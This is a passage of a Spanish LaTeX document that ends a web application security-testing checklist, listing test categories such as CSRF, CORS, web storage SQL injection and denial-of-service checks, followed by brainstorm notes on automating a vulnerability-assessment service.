\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar todas las vulnerabilidades con una puntuación CVSS v2> 4.0
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar de problemas de autenticación y autorización
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar para CSRF
\end{todolist}
\item HTML 5
\begin{todolist}
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar de mensajería web
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar de inyección SQL de almacenamiento web
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Verificar la implementación de CORS
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Verificar la aplicación web sin conexión 
\end{todolist}
\item Realizar pruebas de denegación de servicio
\begin{todolist}
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo}   Probar  anti-automatización
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Probar  bloqueo de cuenta
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo}   Probar para el protocolo HTTP DoS
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo}   Probar para DoS comodín SQL 
\end{todolist}
	\item Generar el reporte del análisis dinámico.
	\item Guardar información en Base de datos de los análisis de vulnerabilidades de aplicaciones analizadas. Esto una vez aceptado el reporte.
\end{enumerate}


Ideas sobre automatización:

\begin{itemize}
    \item Si el proceso estuviera completamente habilitado, el cliente solo tendría que meterse una aplicación móvil. Usuario personal, o cuenta empresarial. Y meter la URL de su aplicación quiza un archivo OPEN VPN para tener acceso.
    \item Las versiones móviles, web intranet permiten empresa pueda usar el producto, versiones móviles publicas son más como un servicio. La versión el modelo nessus, esta bien para hacer Probars entre grupos y al mismo tiempo mantenerlo confidencial.    
    \item inicia como linea de comandos con menus abajo o arriba. Y va evolucionando a versión web. 
    \item Si las herramientas están en GitHub. Hacer un Fork, y luego actualizarlas, en caso de ser necesario.
    \item El script te python puede ayudar a generar el reporte con los datos necesarios, primer pregunta es de donde debería tomar esos datos, configuración por un JSON.
\end{itemize}


\end{document}
